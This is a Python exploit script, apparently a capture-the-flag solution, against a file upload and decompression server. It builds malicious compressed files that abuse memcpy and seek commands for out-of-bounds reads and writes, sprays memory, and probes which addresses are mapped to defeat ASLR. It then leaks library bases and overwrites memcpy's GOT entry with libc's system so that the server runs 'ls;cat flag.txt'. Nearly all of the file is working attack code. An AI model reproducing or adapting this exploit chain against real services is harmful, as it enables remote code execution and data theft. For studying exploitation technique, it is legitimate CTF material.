import requests
import socket
from pwn import remote, context, args, u64, p64, ELF

context.log_level = 100

### INTERACTION ###

def uploadFile(blob: bytes, fileid: int):
    assert (fileid < (1<<31) - 1)

    multipart_form_data = {
        'file': (f'payload_{fileid}', blob),
    }

    res = requests.post(
        f"http://{SERVER_IP}:{SERVER_PORT}/upload/{fileid}",
        files=multipart_form_data
    )

    return res

def getFile(fileid: int, extract="true"):
    res = requests.get(f"http://{SERVER_IP}:{SERVER_PORT}/files/{fileid}?extract={extract}")
    return res

# Used by isAddrMapped oracle
def getFileRaw(fileid):
    rawReq = f'GET /files/{fileid}?extract=true HTTP/1.1\r\nAccept: */*\r\nConnection: close\r\n\r\n'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP , SERVER_PORT))
    io = remote.fromsocket(s)
    io.send(rawReq.encode())
    io.recvuntil(b'\r\n\r\n')
    buf = io.recv(2)
    io.close()
    s.close()
    return buf

### EXPLOIT ###

IN_ADDR = 0x42069000000 # PROT R
OUT_ADDR = 0x13371337000 # PROT RW
M64 = (1<<64)-1

def align(x, a=0x1000):
    mask = a-1
    return (x + mask) & ~mask

class CompressedFile():
    __slots__ = ['cur', 'content', 'out']

    def __init__(self, filesize):
        self.cur = 16
        self.content = b''
        self.content += p64(0x0123456789abcdef) # magic
        self.content += p64(filesize) # file size
        self.out = OUT_ADDR

    def nop(self):
        self.content += b'\x00' # cmd0
        self.cur += 1

    def write(self, b: bytes):
        assert len(b) == 1

        self.content += b'\x01' + b # cmd1 + byte
        self.cur += 2
        self.out += 1 & M64

    def seek(self, off):
        self.content += b'\x02' # cmd2
        self.content += p64(off) # offset
        self.cur += 9
        self.out += off & M64

    
    def memcpy(self, off, count):
        # memcpy(out, out-off, count);
        self.content += b'\x03' # cmd33
        self.content += p64(off) # offset
        self.content += p64(count) # offset
        self.cur += 17
        self.out += count & M64

def isAddrMapped(addr, fileid, filelen=2):
    toup = CompressedFile(filelen)
    
    # addr = OUT_ADDR - off
    off = (OUT_ADDR - addr) & M64
    # memcpy(toup.out, addr, 1)
    toup.memcpy(off, 1)
    # *(toup.out+1) = 0x41
    toup.write(b'A')

    uploadFile(toup.content, fileid)
    res = getFileRaw(fileid).split(b'\r\n')[-1]
    isMapped = res[1] == 0x41
    
    return isMapped

def readFromAddr(addr, size, fileid):
    toup = CompressedFile(size)

    off = (OUT_ADDR - addr) & M64
    toup.memcpy(off, size)

    uploadFile(toup.content, fileid)
    res = getFile(fileid)

    return res.content

SERVER_IP = args.SERVER_IP or '127.0.0.1'
SERVER_PORT = int(args.SERVER_PORT or 7002)

if args.EXPLOIT:
    print (f"Spraying memory to allocate 3840mb of memory", end='')
    size =    0x000004000000
    for i in range(0, 60):
        print ('.', end='')
        #print (f"Spray: {i = } {mem = :#x}")
        # this will create mappings in the father process of the given size
        isAddrMapped(IN_ADDR, i, size)

    print ('OK')

    start = 0x7f0000000000
    end = 0x800000000000 
    step = 0x100000000 # 4gb

    isMapped = False
    j = 0xff
    while isMapped == False:
        leakAddr = start + j*step
        isMapped = (isAddrMapped(leakAddr, 1000 + j))
        j -= 1
        if j < 0:
            raise ValueError("wtf j < 0")

    # at this point we have a mapped address like this
    # 0x7fXX00000000

    def linearFindLargest(base, increment, idstart):
        for i in range(0, 16)[::-1]:
            print (f"{base + increment*i:#x}", end='\t|\t')
            if isAddrMapped(base + increment*i, idstart+i):
                print ('Yes')
                return i*increment
            print ('No')
        raise Exception("find_largest should not fail")

    # Find upper bound, we can't do a binary search because there are some holes which
    # screw things up
    lastMappedPage = leakAddr
    # + linearFindLargest(leakAddr, 0x100000000, 39000) # +0x8000000 because of holes
    lastMappedPage += linearFindLargest(lastMappedPage, 0x10000000, 40000)
    lastMappedPage += linearFindLargest(lastMappedPage, 0x1000000, 40100)
    lastMappedPage += linearFindLargest(lastMappedPage, 0x100000, 40200)
    lastMappedPage += linearFindLargest(lastMappedPage, 0x10000, 40300)
    lastMappedPage += linearFindLargest(lastMappedPage, 0x1000, 40400)

    print (f"{lastMappedPage = :#x}")

    # Scan backwards looking for b'\x7fELF'
    i = 50
    numElf = 0

    while numElf != 2:
        theAddr = lastMappedPage-0x1000*i
        hdr = readFromAddr(theAddr, 4, 40500+i)
        print(f"{i:02d}) Elf in {theAddr:#x}? {hdr.hex()}")
        if hdr == b'\x7fELF':
            numElf += 1
            print (f"found elf at {theAddr:#x}")

        if i > 70:
            print ("Exploit failed, upper bound address was wrong")
            exit(1)

        i += 1
    
    libkaylebase = theAddr
    print (f"{libkaylebase = :#x}")
    memcpy_got = libkaylebase + 0x4048
    print (f"{memcpy_got = :#x}")
    libcbase = libkaylebase - 0x442000
    print (f'{libcbase = :#x}')
    print (readFromAddr(libcbase, 100, 123000))
    libc = ELF('./libc-2.33.so')
    libc.address = libcbase
    print (f"{libc.symbols['system'] = :#x}")

    # exp is a CompressedFile which:
    # - writes libc.system to memcpy_got
    # - calls memcpy(cmd, 0, 0) -> system(cmd)
    cmd = b"ls;cat flag.txt;\x00"
    exp = CompressedFile(24)
    
    exp.seek((memcpy_got - OUT_ADDR)&M64)
    # out=memcpy_got
    for b in p64(libc.symbols['system']):
        exp.write(bytes([b]))
    # now out=memcpy_got+8
    # memcpy(out, out-off, size) will be
    # system(out)
    
    in_addr_off = len(exp.content)
    exp.content += cmd
    # seek to IN_ADDR+in_addr_off, that's where cmd is stored
    exp.seek((IN_ADDR + in_addr_off - (memcpy_got + 8))&M64) 
    exp.memcpy(0, 0) # system(cmd)
    
    uploadFile(exp.content, 123001)
    # profit
    getFile(123001)
